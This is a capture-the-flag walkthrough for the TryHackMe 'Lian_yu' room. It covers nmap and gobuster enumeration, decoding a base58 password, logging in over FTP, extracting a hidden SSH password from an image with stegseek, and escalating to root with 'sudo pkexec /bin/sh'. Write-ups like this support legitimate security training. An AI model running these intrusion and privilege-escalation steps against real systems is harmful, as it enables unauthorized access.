# Lian_yu-CTF

https://tryhackme.com/room/lianyu

**Use nmap to scan for open ports: sudo nmap -sS -sC -sV 10.10.78.215** 

	PORT    STATE SERVICE VERSION

	21/tcp  open  ftp     vsftpd 3.0.2

	22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)

	80/tcp  open  http    Apache httpd

	111/tcp open  rpcbind 2-4 (RPC #100000)

**Use gobuster to scan for directories: gobuster -t 100 dir -u http://10.10.78.215/ -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt**

	http://10.10.78.215/island               (Status: 301) [Size: 235] [--> http://10.10.78.215/island/]

Head to the page and take note of the hidden password by inspecting page source 

**Use gobuster again to find for more hidden locations inside the /island :** 

**gobuster -t 100 dir -u http://10.10.78.215/island -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt**

	http://10.10.78.215/island/2100  

Head to the page and inspect the source code , a clue is given:

	<!-- you can avail your .ticket here but how?   -->

**Use gobuster agian with the extension .ticket: gobuster -t 100 dir -u http://10.10.78.215/island/2100 -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .ticket

	http://10.10.78.215/island/2100/green_arrow.ticket

Head to the link to find out a password

**Use cyberchef , from base58 to decode the password** 

Login to the ftp server with the user as codeword *white text* and password from the cyberchef conversion 

ls the FTP server and the following files will be found:

	-rw-r--r--    1 0        0          511720 May 01  2020 Leave_me_alone.png
	-rw-r--r--    1 0        0          549924 May 05  2020 Queen's_Gambit.png
	-rw-r--r--    1 0        0          191026 May 01  2020 aa.jpg
 
 get all of the above files

*Explore around the FTP server and you will find another user : slade *potential user for ssh*

**Use stegseek aa.jpg to unlock aa.jpg file**

Two files were found:

	passwd.txt

	shado

*shado file contains the password for SSH*

login via ssh : sudo ssh slade@10.10.78.215

cat user.txt to find the first flag 

sudo -l :

	(root) PASSWD: /usr/bin/pkexec

**sudo /usr/bin/pkexec /bin/sh** to gain a shell

root access in gained

cat root.txt to get the final flag

